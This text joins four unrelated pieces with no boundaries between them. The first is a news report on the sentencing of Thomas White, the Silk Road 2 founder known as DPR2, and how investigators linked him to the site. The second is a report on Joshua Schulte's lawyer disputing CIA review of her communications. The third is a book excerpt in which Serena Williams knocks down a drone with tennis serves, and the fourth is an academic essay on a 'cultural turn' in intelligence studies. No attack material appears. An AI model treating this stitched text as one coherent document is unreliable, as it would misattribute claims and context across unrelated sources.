Silk Road 2 Founder Dread Pirate Roberts 2 Caught, Jailed for 5 Years
For years, the arrest and case has been kept under-wraps. Friday, a court sentenced Thomas White to 5 years and 4 months for his role in running a huge dark web drug marketplace.
In 2015, WIRED published a list of the ‘dark web drug lords who got away.’ That list included the Dread Pirate Roberts 2 (DPR2), the creator of the second Silk Road site, which launched almost immediately after the FBI ended the first with the famous arrest of founder Ross Ulbricht.
Under DPR2, Silk Road 2 went on to rake in hundreds of thousands of dollars a day. The FBI shut that one down too and arrested its remaining administrator. By that time, DPR2 had already passed ownership of the site on and, publicly, it looked like he had evaded prosecution.
But today, a court in Liverpool, England, sentenced Thomas White, a technologist and privacy activist, for crimes committed in part while running Silk Road 2 under the DPR2 persona, among other crimes committed under another persona. White pleaded guilty to drug trafficking, money laundering, as well as making indecent images of children, and was sentenced to a total of 5 years and 4 months in prison.
White’s arrest took place in November 2014, but the case has remained largely under-wraps because of the UK’s strict court reporting rules, which prohibit journalists from covering some cases before their conclusion. This is to stop suspects facing "trial by media," and in order to let cases run their course.
Paul Chowles, an investigator from the National Crime Agency (NCA) who worked on the case, told Motherboard in a phone call one piece of evidence included the private encryption key belonging to DPR2 on one of White’s computers. If someone possesses the private part of a PGP key, which is used to decrypt and sign messages, it can be a good indicator that they are behind a particular online identity.
White has been out of prison on bail since his arrest in 2014, and became reasonably well-known in security circles under his real name in the time between his arrest and sentencing. After working on the Silk Road 2, White adopted the handle ‘The Cthulhu,.’ a moniker that may be familiar to those who follow technology news. On Twitter he mused about security and privacy topics, and has appeared under his own name in articles in Motherboard, Forbes, and more as an expert on Tor and other subjects. He previously ran a website archiving large data breaches that anyone could download, including the MySpace breach, data from hacked affairs website Ashley Madison, and customer information from a Muslim-focused dating site called ‘Muslim Match.’ White wrote blog posts on his own website, including a guide on how to securely setup a Tor hidden service, and he also ran a number of nodes for the volunteer-driven Tor anonymity network.
White declined to speak to Motherboard on the record about his case. White deleted his Cthulhu Twitter account on Thursday.

After the FBI took down the original Silk Road site in 2013 and arrested Ulbricht, a small cabal of Silk Road veterans banded together to create its replacement. Those included moderators of the first site, and “StExo,” White’s persona which he used to offer money laundering services.
White spear-headed that effort, and told others he would drop StExo and take on the mantle of DPR2, according to Chowles from the NCA. The Dread Pirate Roberts is a reference to the character from the book and film The Princess Bride, in which the title trickles down from successor to successor.
“DPR2, aka Thomas White, was the boss. He was the controlling mind in all of this, and he was the one driving it forward,” Chowles added.

One Silk Road moderator that White directed went by the handle “Cirrus.” As Motherboard showed in 2014, Cirrus was an undercover law enforcement official who captured chat logs detailing White’s transition from StExo to DPR2.
“He was able to capture that; that kind of transition,” Chowles said, referring to Jared Der-Yeghiayan, the US Department of Homeland Security (DHS) agent who controlled the Cirrus account. Chat logs US authorities recovered from the computer of Blake Benthall, Silk Road 2’s co-administrator, reflected much the same thing, Chowles added.
In a longform 2016 profile, DPR2 told Motherboard what it was like to create the second Silk Road.
“Once you hit that enter button, you've just launched something that you know there is going to be an absolutely fucking huge manhunt after you,” he said.
In December 2013, when law enforcement agencies arrested a number of the original moderators, DPR2 stepped back from public view. When the FBI launched Operation Onymous the following year, which took down Silk Road 2, UK authorities arrested White.
“This [wouldn’t] have been achieved without the significant assistance we’ve had from the [Department of] Homeland Security and the FBI and the Department of Justice,” Garry Tancock, a second NCA investigator who worked on the case, told Motherboard in a phone call.
"He was the controlling mind in all of this, and he was the one driving it forward."
The NCA investigators linked White first to the StExo identity in part by following financial and bitcoin transactions in the early days of the account’s creation.
“We effectively got him from his day one, week one, of activity on Silk Road,” Chowles said. Chowles explained that included tracing a loan from payday loan company Wonga in White’s name, which was then sent to cryptocurrency exchange Mt. Gox, which then transferred bitcoin funds to the StExo account on Silk Road and paid for some items on the site. Other evidence included receipts for items seized from other Silk Road vendors addressed to White, and White being in possession of bitcoin wallets associated with DPR2.
John Williams from the Crown Prosecution Service (CPS) told Motherboard in a statement that White "received an income that allowed lavish spending with no credible explanation."
The case has not been straightforward, however. Chowles said the NCA had challenges with White’s use of encryption. The agency was eventually successful, in part because of gaining access to a password manager which contained the unlock phrase for one of White’s encrypted laptops.
The whole process has also taken years. According to a source familiar with the case, the investigation data didn’t arrive in the UK until June 2016, and the FBI didn’t provide full copies until December 2018. Motherboard granted the source anonymity to speak more openly about a criminal case.
White’s motivation was a mix of financial gain and power, Chowles believes. Chat logs between White and Benthall said White planned to start a paid-for child pornography site to make money, Charles said. White would tell Benthall to work on a UK timezone and write in a particular way, the investigator added.
“Might set a forum up in onion land to bring together people who run hidden services to share knowledge? What do you think?” White tweeted in 2015.

Client-attorney privilege? Not when you're accused of leaking Vault 7 CIA code
Lawyer for Joshua Schulte unhappy about agency review
By [Kieren McCarthy in San Francisco](  11 Apr 2019 at 22:05
The lawyer for former CIA employee Joshua Schulte is unhappy the spy agency is allowed to review communications with her client before she receives it and has accused the agency of trying to intimidate her.
Schulte's lawyer, Sabrina Shroff, appeared in a New York court on Wednesday and argued that the CIA was abusing client-attorney privilege as well as threatening her with future legal repercussions for receiving confidential material.
"The CIA essentially has threatened us,” Shroff told the judge. Asked whether the spy agency was also listening in on her confidential conversations with her client, she responded: "We don't know."
The CIA [believes]( that Schulte was behind a [massive leak]( of material from the spy agency that outlined how it is able to install spy software on laptops and phones. But it has been unable to prove the assertion.
Schulte is currently in jail on unrelated charges of possession and distribution of child abuse images but the CIA has made it plain he is the prime suspect in the information leak. Schulte was in charge of a server that contained 54GB of illegal content but has pled not guilty, arguing that he was running a public server and had no idea about the images.
Thanks to his work for the CIA's engineering development group and the spy agency's suspicions that he was behind the leak, he and his lawyer have been put under extreme restrictions.
Schulte's lawyer has to make a request to meet with him one week prior to any meeting. He is then transferred to a special secure area that is monitored by CCTV before being strip-searched and chained to the floor. His lawyer is not allowed to take in any equipment and must use a government-supplied computer to review any material – conditions [imposed]( [PDF] by the judge.
But despite specific provisions that prevent jail staff from recording any audio or sharing any information with the prosecution, Shroff suspects the CIA is monitoring her meetings regardless.
Delay tactics
She is also frustrated that the court ordered that any material produced by Schulte is first reviewed by the CIA before it is supplied to her, and that the agency seems to be going out of its way to delay access, as well as frustrate her efforts to provide him with a defense.
"We are experiencing significant delay in the CIA's process of classifying our client’s work product," she [wrote]( [PDF] to the judge in March, giving the example of one document that had taken more than two weeks to be cleared. "We ask that the Court impose reasonable deadlines by which time the CIA walled individual must respond to documents given to him for classification review." She argued for a 10-day maximum.
The government [responded]( [PDF] saying that it had no way to speed up the process because the CIA officer in charge of reviewing the material is independent from its prosecutorial team.
In court on Wednesday, the government even argued that the CIA was a "victim" in the whole process, facing criticism for doing its job of protecting national security secrets. Shroff made her disagreement known.
Prior to the court hearing, Shroff repeatedly informed the judge that the CIA was hindering her work "because the CIA insists that all of his written communications with counsel - down to each comment or proposed edit to any work product - must be reviewed and cleared in advance by the 'walled' CIA employee."
The walled employee has also failed to sign a Memorandum of Understanding, she [complained]( [PDF], by "insisting on continued edits to standard language." Schoff argued for restrictions surrounding the search warrants lodged against her client two years earlier be lifted because they have contained no confidential information.
In reply, the government [argued]( [PDF] that Schulte and his lawyer had broken an earlier agreement not to share any information in the case, accusing them of providing information to the press.
Thanks to the CIA-imposed delays, the judge delayed the start date of the trial – which was due to begin on April 8 – and instead ordered a joint conference yesterday, April 10.
Here's a solution
After Schoff outlined her frustrations at that hearing, the New York attorney prosecuting Schulte for the child abuse images charge suggested that one of his lawyers be used to review communications instead of the CIA employee, in order to speed things up.
Schoff argued that that process would make it even easier for the CIA to break client-attorney privilege. "I want to have an open attorney-client relationship with Mr Schulte just like I do with everyone else," she pleaded with the judge. "We don't want to have Mr Schulte's documents read by the CIA at all," she told the hearing according to a [report]( from Law360.
It's unclear how the judge will ultimately decide – or whether that decision will even be made public since the entire case is under a special protective order.
The judge could simply order that the two cases – the child abuse images case and the CIA leak case – be separated. But then, of course, that would limit the CIA's ability to make Schulte's life a misery.

@_subject: Serena Versus the Drones 
My new book, [How To]( comes out on September 3rd (preorder: [Amazon]( [Barnes & Noble]( [IndieBound]( and [Apple Books](
One of the most exciting things about writing How To was that, for a few chapters, I was able to reach out to some extremely cool people who were willing to apply their unique expertise to ridiculous tasks. Among those who generously agreed to help was [Serena Williams](
Here’s a portion of the chapter “How to Catch a Drone”, in which Serena helped test whether tennis serves could be an effective countermeasure against flying robots … by taking a drone out onto a court and hitting tennis balls at it until it crashed.
How to Catch a Drone
A wedding-photography drone is buzzing around above you. You don’t know what it’s doing there and you want it to stop.
Let’s suppose you have a garage full of sports equipment— baseballs, tennis rackets, lawn darts, you name it. Which sport’s projectiles would work best for hitting a drone? And who would make the best anti-drone guard? A baseball pitcher? A basketball player? A tennis player? A golfer? Someone else?
There are a few factors to consider — accuracy, weight, range, and projectile size.
One sport I couldn’t find good data on was tennis. I found some studies of tennis pro accuracy, but they involved hitting targets marked on the court, rather than in the air.
So I reached out to Serena Williams.
To my pleasant surprise, she was happy to help out. Her husband, Alexis, offered a sacrificial drone, a DJI Mavic Pro 2 with a broken camera. They headed out to her practice court to see how effective the world’s best tennis player would be at fending off a robot invasion.
The few studies I could find suggested tennis players would score relatively low com- pared to athletes who threw projectiles— more like kickers than pitchers. My tentative guess was that a champion player would have an accuracy ratio around 50 when serving, and take 5–7 tries to hit a drone from 40 feet. (Would a tennis ball even knock down a drone? Maybe it would just ricochet off and cause the drone to wobble! I had so many questions.)
Alexis flew the drone over the net and hovered there, while Serena served from the baseline.
Her first serve went low. The second zipped past the drone to one side.
The third serve scored a direct hit on one of the propellers. The drone spun, momentarily seemed like it might stay in the air, then flipped over and smashed into the court. Serena started laughing as Alexis walked over to investigate the crash site, where the drone lay on the court near several propeller fragments.
I had expected a tennis pro would be able to hit the drone in five to seven tries; she got it in three.

This article explores an emerging “cultural turn” in intelligence studies, which, if fully realized, could entail the expansion of the discipline to include new methodologies and theories, and a more integrative understanding of historical causality that locates intelligence agencies within the widersocio-cultural domain they inhabit. It has two parts. The firstexpands upon what I mean by a new ‘integrative’ understanding of historical causality. The second explores three areas of interest for intelligence scholars where the “cultural turn” has clear and important implications: the study of secrecy, publicity, and “mentalities”.
In recent years a new wave of scholarship, focusing upon the representation of secret intelligence services in various media, has added new vitality to the discipline of intelligence studies.[1]( Jenkins, The CIA in Hollywood; Willmetts, In Secrecy’s Shadow; Boyd Barett, Herrera and Bauman, Hollywood and the CIA; Sbardellati, Edgar Hoover Goes to the Movies; McCarthy, Selling of the CIA; Alford and Secker, National Security Cinema; Oldham, Paranoid Visions; Hepburn, Intrigue; Kackman, Citizen Spy; Hitz, The Great Game; Nashel, Edward Lansdale’s Cold War; Dover and Goodman eds.

Spying in Film and Fiction; Peter Marks, Imagining Surveillance.View all notes It is tempting, therefore, to identify this topical interest in the popular mediation of intelligence agencies as the titular ‘cultural turn’ of this article, and leave it at that. But topicality alone cannot constitute a disciplinary ‘turn’. At stake in this expansion of the discipline to include a consideration of ‘culture’ is something much more fundamental than simply a question of what topics are permissible. In this article I will argue that two conditions are necessary for a fully fledged cultural turn in intelligence studies: the first is an openness to new methodologies and theoretical paradigms, often borrowed from other disciplines, and in particular from the fields of cultural studies, literary theory and the philosophy of history. The second is a new understanding of historical causality that is integrative, recognising that intelligence, as with the rest of the political domain, ‘does not constitute itself independent of and external to society – but is a place of almost continuous sociopolitical interaction.’ Intelligence scholars, to borrow Steven Pincus and William Novak’s wording, ‘should not assume that their chosen area of inquiry can be studied abstracted from other elements of historical experience.’[2]( Pincus and Novak, “Political History After the Cultural Turn”.View all notes Nor, it should be added, are many of those other elements of historical experience entirely abstracted from the history of secret intelligence.
This article is therefore not intended as a comprehensive literature review of recent cultural studies of intelligence, though it does identify what this author considers some of the more significant works that assume one or both of the conditions described above. Nor is it a purely descriptive account of a ‘cultural turn’ in intelligence studies that has already occurred. Rather, it seeks to extrapolate from an emerging tendency within the field, a nascent cultural turn if you will, still in the making, in order to outline some guiding principles for its future development, as well as explore some of its implications for the study of intelligence. There are two sections to this article. The first expands upon what I mean by a new ‘integrative’ understanding of historical causality, and contrasts it with traditional historical approaches to intelligence studies. The second explores three key areas of interest for intelligence scholars where this new paradigm has clear and important implications: the study of secrecy, publicity, and ‘mentalities’, or the cultural baggage that accompanies and inspires intelligence practitioners. The implications of a fully fledged cultural turn in intelligence studies need not be limited to these domains, but it is in these domains where integrative and methodologically innovative approaches have already begun to emerge.
To avoid the kind of hostile misinterpretation that often accompanies interventions of this nature, I wish to end this introduction with a plea to the reader, particularly those wedded to more ‘traditional’ methodologies. This is not intended as a rejection of politics, or political approaches to the study of intelligence. Indeed, if anything, the opposite is true; the opening up of intelligence studies to new terrains beyond what was traditionally considered ‘political’ (i.e., the state) expands and extends the range of political enquiry. Rather than rejecting traditional approaches to the study of secret intelligence, this article proceeds from the assumption that embracing new methodologies, and adopting a more integrative understanding of historical causality, an understanding that sees intelligence agencies as enmeshed in a complex ecosystem of political, social and cultural phenomena, can only augment the discipline and extend the reach and significance of its conclusions. Perhaps the reason that intelligence studies is sometimes described as a ‘ghetto’ of diplomatic history and international relations is because its practitioners have hitherto not been bold enough in noting the profound impact of their object of study upon wider society, and its momentous political reverberations beyond the corridors of state.[3]( Aldrich, ““Grow Your Own””, 138.View all notes
It would, however, be disingenuous to deny the critical intent of this article. The cultural turn in intelligence studies, as I conceive it here, has a sting in the tail, but its implications, if fully grappled with, should prove salutary rather than destructive. As I have described elsewhere, a full reckoning with the range of cultural and critical theory that has parsed the relationship between representation and reality necessitates a rejection of what Hans Kellner has described as the authoritarian discourse of reality.[4]( Kellner, “Narrativity in History: Post-Structuralism and Since”, 6.View all notes The unavoidable corollary of recognising that the reality of intelligence is always, to an extent, culturally constructed, is a degree of critical introspection on behalf of intelligence scholars who still regard themselves as the arbiters of historical authenticity, standing as bulwarks against the tide of fantasists and conspiracy theorists who have deceived the wider public about the role and function of intelligence services. Such introspection is categorically not a descent into historical relativism, where the narratives of the most crazed internet blogger (or President of the United States) can stand on the same footing as an experienced scholar who has spent decades in the archive. But it is a reckoning nonetheless, and a realisation that just as intelligence services carry their own cultural baggage, so too do intelligence scholars. Recognising the frailty of our own discipline, the inherently vulnerable yet creative enterprise of constructing meaning from an actively distorted and partially concealed archive of documentary material, is the only pathway to a more honest, diverse, and theoretically complex discipline. In this, I share in the opinion of Senator Daniel Patrick Moynihan, that robust deliberation and critical self-awareness is the pathway to more effective intelligence agencies, just as it is the key to the vitality of any academic discipline.[5]( Moynihan, Secrecy.View all notes
Towards an integrative understanding of historical causality in intelligence studies
Customarily, this would be the moment at which, as a faithful political scientist, I should bemoan the nebulousness of previous attempts to define the central concept of this article, and instead offer my own, more precise, definition. Unfortunately, ‘culture’, as Raymond Williams famously noted, ‘is one of the two or three most complicated words in the English language.’[6]( Williams, Keywords, 87.View all notes Its many meanings, and its many applications across a range of academic disciplines, make a concise definition more or less impossible. When we talk about culture, we mean different things in different contexts. Williams noted four core usages of the term in the modern world. The first is the notion of culture as a form of ‘intellectual, spiritual and aesthetic development’, which was a metaphoric application of the original medieval usage of the term in relation to agricultural cultivation or husbandry.[7]( Ibid., 91.View all notes The second usage is basically as synonym for ‘civilisation’, indicating a ‘general process of social development’, with all the Nineteenth-Century baggage of social Darwinism that such a teleological view of human societies entailed. The third ‘denotes the objects of artistic production’: novels, films, paintings, etc.[8]( Steinmetz, State/Culture, 5.View all notes The fourth relates to the anthropological sense of the term – understanding particular human societies in terms of their shared symbols, behaviours and systems of meaning. For good reason, it is the third and fourth usages of the term, culture as artistic representation and culture as shared behaviours and systems of meaning, that have most interested intelligence studies scholars. More specifically, for the purposes of analytical clarity, we might choose to break-up the ‘cultural’ intelligence studies literature into two camps: the study of media representations of espionage, including the study of spy fiction; and the more anthropological attempt to determine specific intelligence ‘cultures’, usually borrowing the notion of strategic culture from war studies and applying it to an understanding of the specific norms and customs of certain intelligence agencies.
As I have detailed elsewhere, two approaches to spy fiction and the representation of espionage in popular media are pre-eminent within the discipline.[9]( Willmetts, “Reconceiving Realism”.View all notes The first, what I call the ‘mythbusting’ approach, offers, in its crudest form, a balance sheet of the myths and realities of espionage, setting fictional characters and events against their real-life counterparts, and pointing out the inconsistencies between these two columns in the ledger of historical authenticity. The second dominant approach looks for the ‘real-world impact’ of popular representations upon the work and development of intelligence agencies. I will call this the ‘consequentialist’ approach to the study of representation, borrowing the term from ethical philosophy to reflect the sense in which the practitioners of this approach see the value of culture only in terms of its ‘real world’ effects. For example, numerous articles have noted the influence of early spy novelists such as William Le Queux and Erskine Childers with their German invasion fantasies, upon the early development and expansion of Britain’s intelligence services.[10]( Christopher Andrew offers a detailed insight into Le Queux’s influence on the development of the early British Security Service in the opening chapter of his official history of MI5. See Andrew, The Defence of the Realm, 4–53. See also Trotter, “The Politics of Adventure in the Early British Spy Novel”, 30–54; Hiley, “Decoding German Spies”, 55–79.View all notes Likewise, recent studies have also suggested that Ian Fleming’s James Bond had more than just a passing influence upon the early history and culture of the US Central Intelligence Agency.[11]( McCrisken and Moran, “James Bond, Ian Fleming and Intelligence”, 804–821.View all notes I have raised objections to both of these approaches on alternative grounds before, but here I want to reflect upon the form of historical causality that is adopted, perhaps unconsciously, by both of these approaches, and indicate some of its limitations.
Both the ‘mythbusting’ and the ‘consequentialist’ approaches to the study of popular representations of espionage adopt a mechanistic or linear understanding of the relationship between culture and intelligence. This is most commonly characterised by the billiard ball analogy, ‘in which homogenous but atomized elements bounce off each other in a linear and unique sequence lacking any general structure beyond the cumulative effects of the series of individual collisions.’[12]( Resch, Althusser and the Renewal of Marxist Social, 47. See also Dean, “Commentary“, 619. For an innovative discussion on the relationship between agency and structure in the context of the cultural turn in international history see Jackson, “Pierre Bourdieu, the ‘Cultural Turn’ and the Practice of International History”, 155–181.View all notes In the consequentialist approach, this analogy is quite obviously applicable – the value of a particular cultural text is understood in terms of the change it has affected upon the historical development of the espionage services. Sometimes this interaction between the two domains is understood as more enmeshed, in particular, the oft-noted phenomenon of former spies writing fictional novels that reveal guarded truths about their former places of employment.[13]( West, “Fiction, Faction and Intelligence”, 275–289.View all notes Yet even these types of study tend to establish a linear causal argument, exploring how a novelist’s former career as an intelligence officer might have seeped into their writing.
In the ‘mythbusting’ approach to spy fiction, the causal relationship between culture and ‘real’ intelligence breaks down almost entirely. Here spy fictions are derided by professional historians, and often former or current intelligence officers, precisely because they are regarded as being so far removed from the real world of espionage, a world that only the initiated can accurately describe.[14]( See for example Dujmovic, “Hollywood, Don’t You Go Disrespectin’ My Culture”, 25–41; Hitz, The Great Game; Johnson, “Spies in the American Movies”, 5–24.View all notes Culture here is seen to have little or no value, and is a valid subject of enquiry only in so far as an analysis of these texts allows the intelligence scholar to understand the extent of the misinformation about the world of espionage that a gullible public consumes. Ironically, those same intelligence officers who dismiss the negative fictions of their profession as bunk, are often prepared to utilise more glamorous or positive mythologies to seduce the public. Culture can legitimate as much as it can disparage the work of intelligence agencies, and the decision to dismiss a particular fiction as just that, pure fiction, appears often to have as much to do with one’s politics and attitude towards the intelligence services, rather than a genuine commitment to historical authenticity.[15]( This is discussed in greater detail later in this essay in the section on ‘publicity and public relations’.View all notes
The more ‘anthropological’ attempts to understand different ‘intelligence cultures’ (although in reality approaches to this research problem have tended to be more historical than genuinely anthropological), concern themselves, understandably enough, with the values, attitudes and mores that exist within particular intelligence agencies. Such studies have ranged from the insightful, to, in the words of Philip Davies, ‘self-flattering platitudes of the Vincent Pearl variety’, such as the notion that US intelligence officers demonstrate a ‘can do attitude’.[16]( Davies on Michael Turner in Davies, “Intelligence Culture and Intelligence Failure in Britain and the United States”, 496.View all notes But though some of these studies have identified clear and influential features of particular intelligence agencies, what is more debateable, is whether these features are genuinely ‘cultural’ in nature, or whether they are in fact caused by ‘cultural’ sensibilities.
For example, is the oft-cited technophilia of the US intelligence services genuinely a cultural trait?[17]( Mackrakis, “Technophilic Hubris and Espionage Styles During the Cold War”, 378–385.View all notes Or is the explanation more economic in nature – i.e., expensive technical projects lead to bigger budgets, and the bigger budgets of the US intelligence community (relative to other intelligence services around the world) allowed it to invest more heavily in technology? This is not to rule out the idea that, for example, CIA officials are genuine technology enthusiasts, but without a focus upon mentalities and attitudes that undergird key decisions, it is impossible to know. This is in part because of the tendency of intelligence historians working in this sub-field to focus upon outcomes rather than motives, leading at times to post hoc ergo propter hoc logical fallacies. To return to our example, simply because the CIA invested in satellite technology, it does not necessarily follow that their motives for doing so were driven by cultural technophilia. It could follow, but the motives cannot be assumed by the outcomes.
Another limitation of such studies is they tend to assume that intelligence cultures spring like Minerva from the intelligence services themselves. Mark Stout, for example, traces contemporary US intelligence culture to US intelligence activities during the First World War.[18]( Stout, “World War I and the Birth of American Intelligence Culture”, 378–394.View all notes But what about the received values and predilections that intelligence officers bring with them from the world beyond the shadowy realm? New recruits might well be inculcated into a particular organisational culture, but values, attitudes and belief-systems, in-short, mentalities, run much deeper, and are forged out of what Raymond Williams described as ‘structures of feeling’, whose sources are broad and drawn from a wide variety of influences. Simply put, we are much more complex creatures than the work we do.
As with the two dominant approaches to cultural representations of espionage, the mechanistic billiard ball notion of causality applies – intelligence is portrayed as a hermetically sealed world with little or no structural relationship to wider society and culture. It is conceived as a domain apart, quite understandable given that official secrecy actively seeks to seal if off from the outside world. But no intelligence agency is an island. Their activities are shaped and suffused by extrinsic cultural values, just as those same cultural values can be warped by the activities of intelligence agencies. I will provide more substantive examples of this enmeshing of intelligence with the outside world in the next section, but before doing so I want to propose a different model of historical causality that accounts for this entanglement.
There are many implements in the toolbox of cultural theory that could be utilised here to overcome the disciplinary inclination to separate what is considered the properly political from other domains of human experience. Clifford Geertz, perhaps the singularly most influential figure upon the cultural interpretation of social practice, developed a reciprocal hermeneutics in which rituals, ‘deep games’ or ‘collectively sustained symbolic structures’ both embody and shape social and political practices.[19]( Geertz, “Deep Play: Notes on the Balinese Cockfight”, 56–86.View all notes Claude Lévis-Strauss, Northrop Frye, Hayden White and many others have argued, in different ways, for the unavoidably political implications of narrative structures, which are taken, in the words of Fredric Jameson, to be ‘the central function or instance of the human mind’, and sole means by which meaning is constructed out of the otherwise unintelligible salmagundi of historical experience.[20]( Jameson, The Political, 13.View all notes Raymond Williams noted the perpetual ‘ordinariness’ of culture as an everyday practice. To transpose Williams’ idea to our own field, we might say that the seemingly pedestrian work of intelligence analysis requires creative acts just as the penning of a spy novel out of historical experience involves leaps of imagination.[21]( Williams, “Culture is Ordinary”, 5–14. See also Williams, The Long Revolution, 41–71.View all notes Stuart Hall regarded culture as the ‘arena of consent and resistance’, where hegemonic ideologies are secured, but also the site from which forms of ideational opposition can emerge.[22]( Hall, “Notes on Deconstructing the Popular”, 227–239.View all notes We could continue this roll-call of canonical cultural theorists for many pages, suffice to say, all have grappled with the question of the relationship, or more precisely, the interrelationship, between the cultural, the social, and the political – indeed this is the defining feature of cultural studies as opposed to other forms of aesthetic interpretive practice that privilege the text as a site of meaning in itself.
For the purposes of this argument, I will choose to focus upon Louis Althusser’s articulation of Marx’s untranslatable concept of ‘Darstellung’ in terms of what he calls ‘structural causality’, or ‘the concept whose object is precisely to designate the mode of presence of the structure in its effects’. In other words, Althusser conceives a structural unity between the apparently separate domains of human activity (the cultural, the political, the economic). This ‘totality’, as Marxists are inclined to describe it, ‘is merely a specific combination of its peculiar elements, (and) is nothing outside (of) its effects.’[23]( Althusser,Balibar, and Brewster, Reading Capital, 186–189.View all notes Of course for Althusser, as well as for Fredric Jameson, whose book The Political Unconscious offers the fullest and most significant elaboration of Althusser’s concept, that structural unity of effects (totality) is nothing less than dialectical materialism itself. But one needn’t subscribe to a Marxist teleology to find significance in Jameson’s Althusserian theoretical underpinning.[24]( Jameson, The Political Unconscious.View all notes For Jameson, as for Althusser, there was no such thing as an independent variable – if political structures change, so to do cultural forms, and vice versa. It is not a case of reading culture as an interpretation of political reality, or politics as the consequence of cultural values, rather, it is to see historical events and periods for what they are – multifarious and polysemous – or comprised of many different elements, and thus capable of conveying many different forms of meaning. Imagine, for example, attempting to give a full account of the 9/11 terrorist attacks without one of the following elements: the political history of US foreign policy in the Middle East; the development of terrorist tactics over time; the imagination of disaster in Hollywood films and television shows which the spectacle of the attacks so directly and deliberately emulated; the emotions of fear, anger and revenge that dictated the US response to the attacks; the political rituals and forms of memorialisation that have emerged since; the relative degree of preparedness of the US intelligence community for this kind of attack, etc. The answer is that the event we call 9/11 was comprised of all of these things, to ignore one of these aspects would be to offer an incomplete account. 9/11 is the sum of all of these things.
Just as it is at the level of the event, so too with historical periodisation. The periods that most interest Jameson, Althusser and other Marxist cultural critics, of course, are the different modes of production that ultimately unify these disparate elements. But for our purposes, we could choose to adopt this periodising approach on a less grand scale. For example, what about periods of time in which intelligence agencies find themselves the subject of particular scepticism – let’s take the mid-1970s US intelligence community as an example, and in particular the so-called ‘Year of Intelligence’ in 1975. What form did this period of political scepticism towards intelligence take? Was it political? Certainly, with politicians castigating the CIA as the ‘Rogue Elephant’ of US foreign policy from the floor of the Senate, leading to new laws and political mechanisms to hold the US intelligence community to account. Was it cultural? Of course! It’s no coincidence that the year of intelligence was both preceded and followed by Hollywood films that, for the first time, condemned the Agency as murderously amoral.[25]( Olmsted, Challenging the Secret Government, 100–102; Willmetts, In Secrecy’s Shadow, 222–271; Scott, American Politics in Hollywood Film, 119–123.View all notes Was it social? A quick glance at the Pew Research Center’s long-standing study of US public trust in government, and what the results were in the mid-1970s will offer an answer to that.[26]( See Pew Research Center, “Public Trust in Government: 1958–2017”.View all notes Does it make sense to try to disentangle these elements in order to understand the ‘year of intelligence’ as purely the result of political manoeuvring, or purely the consequence of a misinformed and misguided cultural interpretation of the secret state? Not at all. An integrative understanding is the only one that we can begin to offer a full picture of why 1975 happened the way it happened, and how the impact of that year of revelations about the secret state has had an influence that can be found in the pages of a Don DeLillo novel, as much as in the corridors of state. In what follows I want to elaborate upon a few key thematic areas of interest for intelligence studies scholars, for which an integrative approach is changing, or could change, our understanding of them.
Until quite recently, official secrecy was a remarkably under-theorised aspect of governance and international relations.[27]( Some notable exceptions include Moynihan, Secrecy; Vincent, The Culture of Secrecy: Britain, 1832–1998; Bok, Secrets; Shils, The Torment of Secrecy.View all notes Max Weber made the case for secrecy as a necessary precondition for effective bureaucratic deliberation. Jeremy Bentham argued the opposite – that publicity was the ideal to which all enlightened democracies should strive. And Georg Simmel noted the importance of secrecy in regulating the flow and control of information, and therefore as a means to power. But these theories, though seminal, formed only a small part of each of these author’s overarching philosophical projects, no more than a single article in the case of Bentham and Simmel, and only a few sketches in the service of a much wider argument in the case of Weber. Up until quite recently, few have taken up the task of elaborating upon these ideas, or bringing new ways of thinking about secrecy to the table. This is surprising, given the far-reaching implications of secrecy for numerous disciplines, and especially when compared to the substantial body of work that has emerged over many decades on the attendant concept of privacy.[28]( The Stanford Encyclopaedia of Philosophy, for example, contains entries for both ‘Publicity’ and ‘Privacy’, but no entry for ‘Secrecy’.View all notes
Perhaps as a result of the renewed interest in covert affairs in the wake of the 9/11 attacks, the last decade, however, has witnessed the publication of a number of major studies on secrecy from a variety of disciplinary perspectives. Intelligence historians have offered book-length accounts of the emergence of official secrecy in Britain and America, and how governments have dealt with unwelcome disclosures.[29]( Moran, Classified; Frost, Classified.View all notes Political philosophers have tried to overcome the seemingly fundamental contradiction of keeping secrets in an open society.[30]( Thompson, “Democratic Secrecy”, 181–193.View all notes And cultural and literary theorists have noted the impact of government secrecy, particularly in the US, upon narratives of incredulity and suspicion towards government institutions.[31]( Olmsted, Real Enemies; Fenster, Conspiracy Theories; Knight, Conspiracy; Willmetts, In Secrecy’s Shadow.View all notes Thanks to this multidisciplinary, and at times genuinely interdisciplinary, interest in secrecy, a new academic journal was recently launched, dedicated to the study of secrecy and society. In the first issue, two of its contributors proclaimed the inauguration of a new discipline, Secrecy Studies, noteworthy for its interdisciplinarity and methodological innovation that provide a ‘foundation for the investigation of secrecy across the very fabric of society.’[32]( Maret, “The Charm of Secrecy”,7. See also Birchall, “Six Answers to the Question: “What is Secrecy Studies?””.View all notes
This urge to study secrecy as a phenomenon that cuts across the different domains of human experience is not a purely theoretical concern. It is also a practical impediment. For as David Vincent noted, in one of the few studies that predated this new wave of secrecy scholarship: ‘Secrecy is a profoundly volatile compound’, the maintenance of which requires the subjective commitment to systems of values and beliefs that cannot be fully comprehended by ‘legal and procedural histories of the subject’.[33]( Vincent, The Culture of Secrecy, 14.View all notes Moreover, as Vincent goes on to note, secrecy stands in a symbiotic relationship with the issue of public trust. Thus, though the formal creation of government secrets can be understood in terms of those laws and procedures, their consequences are most profoundly felt in culture and society at large.
One of the more developed literature on the socio-cultural implications of secrecy is the study of conspiracy theories. For if distrust is the natural corollary of secrecy, then conspiracy theories, or ‘the paranoid style’, as the historian Richard Hofstadter famously termed it, should be understood as the condition that emerges when trust has all but evaporated. This is no longer the study of anomalous political curiosities – Hofstadter regarded the paranoid style as a significant but fringe phenomenon in American political life. Rather, political paranoia could now be regarded as one of the fundamental issues of our times – it helped, in no small measure, to sweep Donald Trump into office. It undergirds the discourse of populist parties across the globe on both the far left and far right of the political spectrum, though the right, as in the aftermath of Watergate, have been more successful in capitalising on this widespread distrust of government. It is the reason Donald Trump and his ideological state apparatus in Breitbart News and other sources of popular suspicion have so fiercely attacked the US intelligence community as the ‘Deep State’, gaining political capital in the process.[34]( Althusser, “Ideology and Ideological State Apparatuses”, 121–176.View all notes And it is why Trump has been able to so blithely dismiss intelligence reports of Russian intercession in the 2016 election in support of his campaign – ‘These are the same people that said Saddam Hussein had weapons of mass destruction.’[35]( Kessler, “The Pre-War Intelligence on Iraq”.View all notes If Trump’s use of the CIA and FBI as political footballs in the service of his paranoid politics suggests anything, it is that the decline of trust in the intelligence services has consequences far beyond the affairs of the intelligence services themselves.
